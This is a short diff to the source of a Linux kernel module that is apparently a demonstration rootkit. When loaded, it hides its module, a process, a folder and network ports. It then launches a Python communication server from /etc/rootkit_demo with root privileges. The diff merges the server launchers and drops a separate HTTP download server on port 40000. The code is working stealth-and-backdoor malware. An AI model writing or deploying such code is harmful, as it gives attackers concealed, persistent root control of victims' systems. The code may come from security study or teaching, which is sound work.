@@ -29,16 +29,8 @@ void hide_module(void)
 /*
 Start the communication server
 */
-void start_comm(void) {
+void start_server(void) {
     char *argv[] = { "/bin/bash", "-c", "python3 /etc/rootkit_demo/public/source/server.py &", NULL};
-    call_usermodehelper(argv[0], argv, userEnv, UMH_WAIT_PROC);
-}
-
-/*
-Start the download server
-*/
-void start_down(void) {
-    char *argv[] = { "/bin/bash", "-c", "cd /etc/rootkit_demo/public/; python3 -m http.server 40000 &", NULL};
     call_usermodehelper(argv[0], argv, userEnv, UMH_WAIT_PROC);
 }
 
@@ -49,13 +41,12 @@ void start_down(void) {
 // Function triggered when lkm is loaded
 static int __init my_init(void)
 {
-	hide_module();
-	hide_process();
-	hide_folder();
-	hide_ports();
+    hide_module();
+    hide_process();
+    hide_folder();
+    hide_ports();
     
-    start_comm();
-    start_down();
+    start_server();
 
 	return 0;
 }
